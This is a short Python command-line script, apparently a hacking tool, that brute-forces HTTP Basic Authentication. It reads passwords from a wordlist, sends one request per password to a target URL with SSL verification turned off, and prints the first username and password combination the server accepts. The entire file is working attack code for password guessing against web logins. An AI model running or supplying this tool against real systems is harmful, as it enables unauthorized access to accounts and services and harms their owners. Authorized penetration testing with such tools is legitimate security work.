#!/usr/bin/env python3

import argparse
import requests
import base64
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser(description="HTTP Basic Authentication Brute Force Tool")
    parser.add_argument("-u", "--username", required=True, help="The username for authentication")
    parser.add_argument("-w", "--wordlist", required=True, help="The file containing the password list")
    parser.add_argument("-url", "--url", required=True, help="The URL to which requests will be sent")

    args = parser.parse_args()

    brute_force(args.username, args.wordlist, args.url)

def brute_force(username, wordlist_path, url):
    with open(wordlist_path, "r") as file:
        for password in file:
            password = password.strip()
            credentials = f"{username}:{password}"
            auth_header = {"Authorization": "Basic " + base64.b64encode(credentials.encode()).decode()}

            # Skip SSL verification
            response = requests.get(url, headers=auth_header, verify=False)

            if response.status_code == 401:
                print(f"Invalid combination: Username {username}, Password {password}, Server response: Unauthorized (401)")
            elif response.status_code == 301:
                print(f"Invalid combination: Username {username}, Password {password}, Server response: Redirect (301)")
            elif response.status_code == 200:
                print(f"Valid combination found: Username {username}, Password {password}, Server response: OK (200)")
                break
            else:
                print(f"Unknown HTTP status code {response.status_code} for Username {username}, Password {password}")

if __name__ == "__main__":
    main()
